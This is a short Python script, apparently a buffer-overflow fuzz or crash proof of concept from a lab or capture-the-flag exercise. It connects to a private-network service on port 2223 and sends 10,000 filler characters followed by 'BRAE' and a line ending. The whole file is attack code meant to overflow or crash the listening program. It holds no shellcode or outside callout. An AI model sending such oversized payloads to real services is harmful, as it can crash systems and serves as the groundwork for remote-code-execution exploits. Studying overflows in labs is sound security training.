#!/usr/bin/python3

import socket

def main():
    IP = "192.168.192.167"
    PORT = 2223

    garbage = "1" * 10000
    name = "BRAE"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, PORT))
    sock.send(garbage.encode() + name.encode() + "\r\n".encode())

if __name__ == "__main__":
    main()